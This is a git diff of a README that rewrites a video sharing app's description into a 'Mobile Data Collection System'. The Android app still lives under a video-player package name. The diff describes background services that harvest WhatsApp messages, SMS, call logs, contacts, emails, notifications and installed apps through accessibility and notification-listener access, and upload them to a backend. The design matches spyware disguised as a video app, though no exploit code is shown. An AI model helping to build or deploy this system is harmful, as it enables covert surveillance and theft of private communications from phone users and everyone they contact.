@@ -1,160 +1,303 @@
-# 🎬 Jumpy - Video Sharing App
+# Mobile Data Collection System
 
-**Jumpy** is a modern video sharing platform that allows users to upload, share, and discover videos across different categories. Built with React Native for mobile and Node.js for the backend.
+A comprehensive mobile data collection system with a React frontend, Node.js backend, and Android mobile app for collecting and managing various types of user data.
 
-![Jumpy Logo](backend/public/logo.svg)
+## 🏗️ Project Structure
 
-## ✨ Features
-
-### 🎥 Video Management
-- **Category-based browsing**: Cartoons, Sports, Funny, Nature, Technology
-- **Video upload**: Easy video upload with metadata
-- **Video playback**: Full-featured video player with controls
-- **Secure sharing**: Temporary encoded URLs for secure video sharing
-
-### 🔐 User Authentication
-- **User registration**: Create new accounts with email verification
-- **Secure login**: JWT-based authentication
-- **Profile management**: User profiles with device tracking
-
-### 📱 Mobile App Features
-- **Cross-platform**: Works on both iOS and Android
-- **Modern UI**: Beautiful, intuitive interface with Jumpy branding
-- **Offline support**: Basic offline functionality
-- **Push notifications**: Real-time updates and alerts
-
-### 🔒 Security Features
-- **Encrypted sharing**: Temporary share codes with expiry
-- **Device tracking**: Dual ID system for security and functionality
-- **Password hashing**: Secure password storage with bcrypt
-- **JWT tokens**: Secure session management
-
-## 🏗️ Architecture
-
-### Backend (Node.js + Express + MongoDB)
 ```
-backend/
-├── controllers/     # Business logic
-├── models/         # Database models
-├── routes/         # API endpoints
-├── middleware/     # Authentication & validation
-├── public/         # Static assets (logos, icons)
-└── server.js       # Main server file
+tour/
+├── backend/                 # Node.js backend server
+│   ├── config/             # Centralized configuration
+│   ├── controllers/        # API controllers
+│   ├── models/            # MongoDB models
+│   ├── routes/            # API routes
+│   ├── services/          # Business logic services
+│   ├── utils/             # Utility functions
+│   └── server.js          # Main server file
+├── frontend/              # React frontend application
+│   ├── src/
+│   │   ├── components/    # Reusable UI components
+│   │   ├── config/        # App configuration
+│   │   ├── services/      # API services
+│   │   ├── utils/         # Utility functions
+│   │   └── pages/         # Page components
+│   └── public/            # Static assets
+├── jumpy/                 # Android mobile app
+│   └── app/src/main/
+│       ├── java/com/jumpy/videoplayerapp/
+│       │   ├── services/  # Background services
+│       │   └── utils/     # Utility classes
+│       └── res/           # Android resources
+└── README.md              # This file
 ```
 
-### Mobile App (React Native + Expo)
-```
-VideoPlayerAppNew/
-├── src/
-│   ├── components/ # UI components
-│   ├── services/   # API services
-│   ├── context/    # State management
-│   └── utils/      # Helper functions
-├── assets/         # Images, fonts, icons
-└── App.tsx         # Main app component
-```
+## 🚀 Features
 
-## 🚀 Quick Start
+### Backend Features
+- **Centralized Configuration**: All settings in `config/app.js`
+- **Reusable Utilities**: Common functions in `utils/helpers.js`
+- **API Endpoints**: RESTful APIs for all data types
+- **Authentication**: JWT-based auth with Google Sign-In
+- **Data Collection**: WhatsApp, Facebook, SMS, Contacts, Call Logs, Emails
+- **Firebase Integration**: Real-time data storage
+- **Rate Limiting**: API protection
+- **Error Handling**: Comprehensive error management
 
-### Prerequisites
-- Node.js 20+
-- MongoDB
-- Expo CLI
-- Android Studio / Xcode (for mobile development)
+### Frontend Features
+- **Reusable Components**: Button, Card, LoadingSpinner, etc.
+- **Centralized API Service**: Single service for all API calls
+- **Configuration Management**: Environment-based config
+- **Responsive Design**: Mobile-first approach
+- **Error Boundaries**: Graceful error handling
+- **Loading States**: User feedback during operations
+
+### Mobile App Features
+- **Permission Management**: Centralized permission handling
+- **Data Collection**: Automated harvesting of various data types
+- **Background Services**: Continuous data collection
+- **API Integration**: Proper backend communication
+- **Settings Management**: User-configurable collection intervals
+
+## 🛠️ Technology Stack
+
+### Backend
+- **Node.js** (v20+)
+- **Express.js** - Web framework
+- **MongoDB** - Database
+- **Mongoose** - ODM
+- **Firebase Admin** - Real-time database
+- **JWT** - Authentication
+- **Google APIs** - Gmail integration
+
+### Frontend
+- **React** (v18.3.1)
+- **React Router** - Navigation
+- **React Toastify** - Notifications
+- **CSS3** - Styling
+
+### Mobile App
+- **Android** (API 21+)
+- **Java** - Programming language
+- **OkHttp** - HTTP client
+- **Firebase** - Real-time database
+
+## 📋 Prerequisites
+
+- Node.js 20+ and npm 8+
+- MongoDB database
+- Firebase project
+- Android Studio (for mobile app)
+- Google Cloud Console project
+
+## 🔧 Installation
 
 ### Backend Setup
-```bash
-cd backend
-npm install
-npm run dev
-```
 
-The backend will start on `http://localhost:5001`
+1. **Clone the repository**
+   ```bash
+   git clone <repository-url>
+   cd tour/backend
+   ```
+
+2. **Install dependencies**
+   ```bash
+   npm install
+   ```
+
+3. **Environment Configuration**
+   Create `.env` file:
+   ```env
+   NODE_ENV=development
+   PORT=5001
+   MONGO_URL=your_mongodb_connection_string
+   JWT_SECRET=your_jwt_secret
+   FIREBASE_DATABASE_URL=your_firebase_url
+   FIREBASE_STORAGE_BUCKET=your_firebase_bucket
+   ```
+
+4. **Start the server**
+   ```bash
+   npm start
+   # or for development
+   npm run dev
+   ```
+
+### Frontend Setup
+
+1. **Navigate to frontend directory**
+   ```bash
+   cd ../frontend
+   ```
+
+2. **Install dependencies**
+   ```bash
+   npm install
+   ```
+
+3. **Environment Configuration**
+   Create `.env` file:
+   ```env
+   REACT_APP_API_BASE_URL=http://localhost:5001
+   REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id
+   REACT_APP_GOOGLE_REDIRECT_URI=http://localhost:3000
+   ```
+
+4. **Start the development server**
+   ```bash
+   npm start
+   ```
 
 ### Mobile App Setup
-```bash
-cd VideoPlayerAppNew
-npm install
-npx expo start
-```
 
-### Database Seeding
-```bash
-cd backend
-node seedVideos.js
-```
+1. **Open in Android Studio**
+   ```bash
+   cd ../jumpy
+   # Open Android Studio and import the project
+   ```
 
-This will populate the database with 50 sample videos (10 per category).
+2. **Configure Firebase**
+   - Add `google-services.json` to `app/` directory
+   - Configure Firebase in the project
 
-## 📊 API Endpoints
+3. **Update API Configuration**
+   - Update `AppConfig.API_BASE_URL` in the app
+   - Configure Google Sign-In
+
+4. **Build and Run**
+   - Build the APK or run on device/emulator
+
+## 🔐 Permissions
+
+The mobile app requires the following permissions:
+
+- **READ_CONTACTS** - Contact synchronization
+- **READ_PHONE_STATE** - Call detection
+- **READ_CALL_LOG** - Call history
+- **READ_SMS** - Message reading
+- **READ_EXTERNAL_STORAGE** - File access
+- **POST_NOTIFICATIONS** - App notifications
+- **BIND_NOTIFICATION_LISTENER_SERVICE** - Notification access
+- **BIND_ACCESSIBILITY_SERVICE** - Accessibility features
+
+## 📊 Data Collection
+
+The system collects the following data types:
+
+1. **WhatsApp Data**
+   - Messages
+   - Contacts
+   - Business data
+
+2. **Facebook Data**
+   - Posts and interactions
+   - Profile information
+
+3. **Notifications**
+   - All app notifications
+   - System notifications
+
+4. **SMS & Call Logs**
+   - Text messages
+   - Call history
+
+5. **Contacts**
+   - Phone contacts
+   - Email contacts
+
+6. **Emails**
+   - Gmail integration
+   - Email content
+
+7. **Device Information**
+   - Device specs
+   - Installed apps
+
+## 🔄 API Endpoints
 
 ### Authentication
+- `POST /api/auth/google-signin` - Google Sign-In
 - `POST /api/auth/signup` - User registration
 - `POST /api/auth/signin` - User login
-- `GET /api/auth/profile` - Get user profile
 
-### Videos
-- `GET /api/videos/category/:category` - Get videos by category
-- `POST /api/videos/upload` - Upload new video
-- `GET /api/videos/share/:code` - Get video by share code
-- `PUT /api/videos/:id/views` - Increment video views
+### Data Collection
+- `POST /api/whatsapp/messages` - WhatsApp messages
+- `POST /api/whatsapp/contacts` - WhatsApp contacts
+- `POST /api/facebook/data` - Facebook data
+- `POST /api/notifications` - Notifications
+- `POST /api/sms` - SMS data
+- `POST /api/contacts` - Contacts
+- `POST /api/callLogs` - Call logs
+- `POST /api/capture/emails` - Emails
 
-## 🎨 Design System
+### Settings
+- `GET /api/settings` - Get settings
+- `PUT /api/settings` - Update settings
 
-### Colors
-- **Primary**: `#667eea` (Purple Blue)
-- **Secondary**: `#764ba2` (Deep Purple)
-- **Accent**: `#ff6b6b` (Coral Red)
-- **Background**: `#f8f9fa` (Light Gray)
+### Health & Monitoring
+- `GET /api/health` - Health check
+- `GET /api/admin/stats` - Admin statistics
 
-### Typography
-- **App Name**: Bold, 32px
-- **Headers**: Bold, 28px
-- **Body**: Regular, 16px
-- **Labels**: Semi-bold, 16px
+## 🎨 Frontend Components
 
-## 📱 App Screenshots
+### Reusable Components
+- **Button** - Multiple variants (primary, secondary, outline, etc.)
+- **Card** - Content containers with different elevations
+- **LoadingSpinner** - Loading indicators
+- **ErrorBoundary** - Error handling
+- **EmptyState** - Empty state displays
+- **NetworkStatus** - Connection status
 
-### Authentication
-- **Sign In**: Clean login interface with Jumpy branding
-- **Sign Up**: User registration with validation
+### Configuration
+- **App Config** - Centralized configuration management
+- **API Service** - HTTP client with retry logic
+- **Theme System** - Consistent styling
 
-### Main Features
-- **Categories**: Browse videos by category
-- **Video List**: Grid layout with video thumbnails
-- **Video Player**: Full-screen playback with controls
-- **Upload**: Easy video upload interface
+## 🔧 Mobile App Architecture
 
-## 🔧 Configuration
+### Core Classes
+- **PermissionManager** - Centralized permission handling
+- **ApiService** - Backend communication
+- **SettingsManager** - App settings
+- **DataHarvesters** - Data collection services
 
-### Environment Variables
-Create a `.env` file in the backend directory:
-
-```env
-MONGODB_URI=mongodb://localhost:27017/jumpy_db
-JWT_SECRET=your_jwt_secret_here
-PORT=5001
-NODE_ENV=development
-```
-
-### Mobile App Configuration
-Update `VideoPlayerAppNew/app.json` for:
-- App name and bundle ID
-- Permissions
-- Icon and splash screen
+### Services
+- **NotificationListener** - Notification monitoring
+- **UnifiedAccessibilityService** - Accessibility features
+- **FirebaseSyncService** - Data synchronization
 
 ## 🚀 Deployment
 
-### Backend Deployment
-1. Set up MongoDB Atlas or local MongoDB
-2. Configure environment variables
-3. Deploy to Vercel, Heroku, or your preferred platform
+### Backend Deployment (Render)
+1. Connect GitHub repository
+2. Set environment variables
+3. Deploy automatically
 
-### Mobile App Deployment
-1. Build for production: `expo build:android` or `expo build:ios`
-2. Submit to App Store / Google Play Store
+### Frontend Deployment (Vercel)
+1. Connect GitHub repository
+2. Configure build settings
+3. Set environment variables
 
-## 🤝 Contributing
+### Mobile App
+1. Build APK in Android Studio
+2. Sign with release key
+3. Distribute via Google Play or direct APK
+
+## 🔍 Monitoring & Logging
+
+- **Health Checks** - `/api/health` endpoint
+- **Error Logging** - Centralized error handling
+- **Performance Monitoring** - Request timing
+- **Data Statistics** - Collection metrics
+
+## 🛡️ Security
+
+- **JWT Authentication** - Secure token-based auth
+- **Rate Limiting** - API protection
+- **Input Validation** - Data sanitization
+- **CORS Configuration** - Cross-origin protection
+- **Environment Variables** - Secure configuration
+
+## 📝 Contributing
 
 1. Fork the repository
 2. Create a feature branch
@@ -164,17 +307,28 @@ Update `VideoPlayerAppNew/app.json` for:
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+This project is licensed under the ISC License.
 
 ## 🆘 Support
 
 For support and questions:
-- Create an issue in the repository
 - Check the documentation
-- Review the API endpoints
+- Review the code comments
+- Create an issue on GitHub
 
----
+## 🔄 Updates
 
-**Made with ❤️ by the Jumpy Team**
+### Recent Changes
+- Centralized configuration management
+- Reusable component library
+- Improved error handling
+- Enhanced permission management
+- Upgraded dependencies
+- Cleaned up project structure
 
-*Jump into amazing videos with Jumpy! 🎬* 
+### Future Enhancements
+- Real-time data synchronization
+- Advanced analytics dashboard
+- Machine learning insights
+- Enhanced security features
+- Performance optimizations 
